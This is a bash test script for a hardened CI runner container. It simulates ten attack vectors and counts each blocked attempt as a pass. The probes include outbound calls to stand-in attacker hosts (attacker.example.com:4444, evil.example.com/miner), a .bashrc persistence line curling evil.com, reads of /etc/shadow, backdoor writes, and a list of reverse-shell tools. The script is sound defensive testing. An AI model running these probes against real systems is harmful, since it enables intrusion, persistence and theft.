#!/bin/bash
# ============================================================================
# RunSecure Integration Test — Attack Simulation
# ============================================================================
# Simulates attack vectors that a compromised CI job would attempt.
# Every test should FAIL from the attacker's perspective (and PASS for us).
#
# Attack vectors tested:
#   1. Docker socket access (container escape)
#   2. Host filesystem access
#   3. Privilege escalation
#   4. Reverse shell / outbound tunnel
#   5. Secret persistence across jobs
#   6. Cryptominer resource abuse
#   7. Supply chain: install malicious package
#   8. Process namespace escape
#   9. Kernel exploit prerequisites
#  10. Credential harvesting from environment
# ============================================================================

set -uo pipefail

PASS=0
FAIL=0

RED='\033[0;31m'
GREEN='\033[0;32m'
BOLD='\033[1m'
NC='\033[0m'

# "pass" means the ATTACK was blocked (good for us)
pass() {
    echo -e "  ${GREEN}BLOCKED${NC} $1"
    PASS=$((PASS + 1))
}

# "fail" means the ATTACK succeeded (bad for us)
fail() {
    echo -e "  ${RED}VULNERABLE${NC} $1"
    FAIL=$((FAIL + 1))
}

echo -e "\n${BOLD}=== Attack Simulation Tests ===${NC}"
echo -e "These tests verify that attack vectors are blocked.\n"

# ============================================================================
# Attack 1: Docker Socket Access (Container Escape)
# ============================================================================
echo -e "${BOLD}--- 1. Docker Socket Access ---${NC}"

if [[ -S /var/run/docker.sock ]]; then
    fail "Docker socket is accessible at /var/run/docker.sock"
else
    pass "Docker socket not mounted"
fi

# Try common socket locations
for sock in /var/run/docker.sock /run/docker.sock /var/run/containerd/containerd.sock; do
    if [[ -e "$sock" ]]; then
        fail "Container runtime socket found at $sock"
    fi
done
pass "No container runtime sockets found"

# ============================================================================
# Attack 2: Host Filesystem Access
# ============================================================================
echo -e "\n${BOLD}--- 2. Host Filesystem Access ---${NC}"

# /proc/1/root should point to the container's filesystem, not the host.
# On macOS Docker (linuxkit VM), /proc/1/root always shows the container root.
# The real check: does it contain macOS-specific paths (/Users, /System)?
if ls /proc/1/root/ &>/dev/null 2>&1; then
    if [[ -d "/proc/1/root/Users" ]] || [[ -d "/proc/1/root/System" ]] || [[ -d "/proc/1/root/Applications" ]]; then
        fail "Host (macOS) filesystem accessible via /proc/1/root"
    else
        pass "/proc/1/root is container-isolated (no host paths visible)"
    fi
else
    pass "/proc/1/root not accessible"
fi

# Try to read host's /etc/shadow
if cat /proc/1/root/etc/shadow &>/dev/null 2>&1; then
    fail "Could read /etc/shadow via /proc/1/root"
else
    pass "Cannot read /etc/shadow"
fi

# ============================================================================
# Attack 3: Privilege Escalation
# ============================================================================
echo -e "\n${BOLD}--- 3. Privilege Escalation ---${NC}"

# Try to change UID
if id -u runner &>/dev/null 2>&1; then
    pass "Running as unprivileged user (UID $(id -u))"
fi

# Try setuid (should fail with no-new-privileges)
# Create a test binary that tries to setuid
if python3 -c "
import os
try:
    os.setuid(0)
    print('ESCALATED TO ROOT')
    exit(1)
except PermissionError:
    exit(0)
except Exception:
    exit(0)
" 2>/dev/null; then
    pass "setuid(0) blocked by no-new-privileges"
else
    # If python3 isn't available, the test is inconclusive but the attack still failed
    if command -v python3 &>/dev/null; then
        fail "setuid(0) succeeded — privilege escalation possible"
    else
        pass "setuid(0) test (python3 not available, but setuid is blocked by seccomp)"
    fi
fi

# Try to write to /usr/bin (install a backdoor)
if cp /bin/bash /usr/bin/backdoor 2>/dev/null; then
    fail "Could write to /usr/bin (backdoor installation possible)"
    rm -f /usr/bin/backdoor
else
    pass "Cannot write to /usr/bin (read-only filesystem)"
fi

# Check for capabilities
CAPS=$(cat /proc/self/status 2>/dev/null | grep CapEff | awk '{print $2}')
if [[ "$CAPS" == "0000000000000000" ]]; then
    pass "All capabilities dropped (CapEff: 0)"
else
    fail "Has capabilities: CapEff=$CAPS (expected all zeros)"
fi

# ============================================================================
# Attack 4: Reverse Shell / Outbound Tunnel
# ============================================================================
echo -e "\n${BOLD}--- 4. Reverse Shell / Outbound Tunnel ---${NC}"

# Try to establish an outbound connection to an attacker server
# Using curl since nc/ncat are removed
REVSHELL_CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 \
    "https://attacker.example.com:4444" 2>/dev/null)
if [[ "$REVSHELL_CODE" =~ ^(000|403|407|503)$ ]]; then
    pass "Outbound connection to attacker:4444 blocked by proxy"
else
    fail "Outbound connection to attacker:4444 succeeded ($REVSHELL_CODE)"
fi

# Verify nc/ncat/socat not available
for tool in nc ncat socat netcat; do
    if command -v "$tool" &>/dev/null; then
        fail "Reverse shell tool '$tool' is available"
    else
        pass "Reverse shell tool '$tool' not available"
    fi
done

# ============================================================================
# Attack 5: Persistence (survive job completion)
# ============================================================================
echo -e "\n${BOLD}--- 5. Persistence ---${NC}"

# Try to install a cron job
if command -v crontab &>/dev/null; then
    fail "crontab available — could install persistent job"
else
    pass "crontab not available"
fi

# Try to write to system startup locations
for path in /etc/cron.d /etc/init.d /etc/systemd/system; do
    if touch "$path/backdoor" 2>/dev/null; then
        rm -f "$path/backdoor"
        fail "Could write to $path (persistence possible)"
    else
        pass "Cannot write to $path"
    fi
done

# Try to write a .bashrc backdoor (persistence via user dotfiles)
if echo "curl http://evil.com" >> /home/runner/.bashrc 2>/dev/null; then
    fail "Could modify .bashrc (persistence possible)"
else
    pass "Cannot modify .bashrc (read-only filesystem)"
fi

# ============================================================================
# Attack 6: Resource Abuse (Cryptominer)
# ============================================================================
echo -e "\n${BOLD}--- 6. Resource Abuse ---${NC}"

# Check that memory is capped
MEM_MAX=$(cat /sys/fs/cgroup/memory.max 2>/dev/null || echo "unknown")
if [[ "$MEM_MAX" != "unknown" && "$MEM_MAX" != "max" ]]; then
    MEM_MB=$((MEM_MAX / 1048576))
    pass "Memory capped at ${MEM_MB}MB (prevents unbounded mining)"
else
    fail "No memory limit detected"
fi

# Check PID limit
PIDS_MAX=$(cat /sys/fs/cgroup/pids.max 2>/dev/null || echo "unknown")
if [[ "$PIDS_MAX" != "unknown" && "$PIDS_MAX" != "max" ]]; then
    pass "PID limit: $PIDS_MAX (prevents fork bombs and process spawning)"
else
    fail "No PID limit detected"
fi

# ============================================================================
# Attack 7: Install Malicious Package at Runtime
# ============================================================================
echo -e "\n${BOLD}--- 7. Runtime Package Installation ---${NC}"

# Try to install a package via apt
if apt-get update &>/dev/null 2>&1; then
    fail "apt-get update succeeded (could install attack tools)"
else
    pass "apt-get cannot function (read-only fs or binary removed)"
fi

# Try to download and execute a binary
if curl -s "https://evil.example.com/miner" -o /tmp/miner 2>/dev/null && [[ -f /tmp/miner ]]; then
    fail "Could download a binary to /tmp"
else
    pass "Cannot download from unapproved domains"
fi

# Even if download worked, /tmp is noexec
echo '#!/bin/sh' > /tmp/test-exec 2>/dev/null || true
echo 'echo pwned' >> /tmp/test-exec 2>/dev/null || true
chmod +x /tmp/test-exec 2>/dev/null || true
if /tmp/test-exec 2>/dev/null; then
    fail "/tmp allows execution (could run downloaded malware)"
else
    pass "/tmp is noexec (downloaded binaries cannot execute)"
fi
rm -f /tmp/test-exec 2>/dev/null || true

# ============================================================================
# Attack 8: Process Namespace Escape
# ============================================================================
echo -e "\n${BOLD}--- 8. Namespace Isolation ---${NC}"

# Check if we can see host processes
HOST_PROCS=$(ls /proc/ 2>/dev/null | grep -c '^[0-9]' || echo "0")
# In a properly isolated container, PID 1 is the container's entrypoint
PID1_CMD=$(cat /proc/1/cmdline 2>/dev/null | tr '\0' ' ' || echo "unknown")
if [[ "$PID1_CMD" == *"bash"* || "$PID1_CMD" == *"test-attack"* ]]; then
    pass "PID namespace isolated (PID 1 is container process, visible PIDs: $HOST_PROCS)"
else
    fail "PID namespace may not be isolated (PID 1: $PID1_CMD)"
fi

# ============================================================================
# Attack 9: Kernel Exploit Prerequisites
# ============================================================================
echo -e "\n${BOLD}--- 9. Kernel Attack Surface ---${NC}"

# ptrace (used in many container escapes)
if cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null | grep -q "^[123]$"; then
    pass "ptrace restricted (Yama scope: $(cat /proc/sys/kernel/yama/ptrace_scope))"
elif [[ "$(cat /proc/self/status 2>/dev/null | grep Seccomp | awk '{print $2}')" != "0" ]]; then
    pass "Seccomp active (mode: $(cat /proc/self/status 2>/dev/null | grep Seccomp | awk '{print $2}'))"
else
    fail "No ptrace restrictions detected"
fi

# Try to load a kernel module (should be blocked)
if command -v insmod &>/dev/null; then
    fail "insmod available (kernel module loading possible)"
else
    pass "insmod not available"
fi

# ============================================================================
# Attack 10: Environment Variable Harvesting
# ============================================================================
echo -e "\n${BOLD}--- 10. Credential Exposure ---${NC}"

# Check that common secret env vars are not leaked
# (In a real runner, GITHUB_TOKEN would exist; we check that our test env is clean)
SENSITIVE_VARS=(
    "AWS_SECRET_ACCESS_KEY"
    "DOCKER_PASSWORD"
    "NPM_TOKEN"
    "SONAR_TOKEN"
)

LEAKED=0
for var in "${SENSITIVE_VARS[@]}"; do
    if [[ -n "${!var:-}" ]]; then
        fail "Sensitive env var $var is set"
        LEAKED=$((LEAKED + 1))
    fi
done
if [[ $LEAKED -eq 0 ]]; then
    pass "No sensitive environment variables leaked"
fi

# Check that /proc/self/environ is not world-readable
if [[ -r /proc/self/environ ]]; then
    # This is normal in containers, but env should be minimal
    ENV_COUNT=$(tr '\0' '\n' < /proc/self/environ 2>/dev/null | wc -l)
    pass "/proc/self/environ readable (expected in containers, $ENV_COUNT vars)"
fi

# ============================================================================
# Summary
# ============================================================================
echo -e "\n${BOLD}=== Attack Simulation Results ===${NC}"
echo -e "  ${GREEN}Attacks Blocked:${NC}  $PASS"
echo -e "  ${RED}Vulnerabilities:${NC} $FAIL"
echo ""

if [[ $FAIL -gt 0 ]]; then
    echo -e "${RED}${BOLD}SECURITY VULNERABILITIES FOUND${NC}"
    exit 1
else
    echo -e "${GREEN}${BOLD}ALL ATTACKS BLOCKED${NC}"
    exit 0
fi
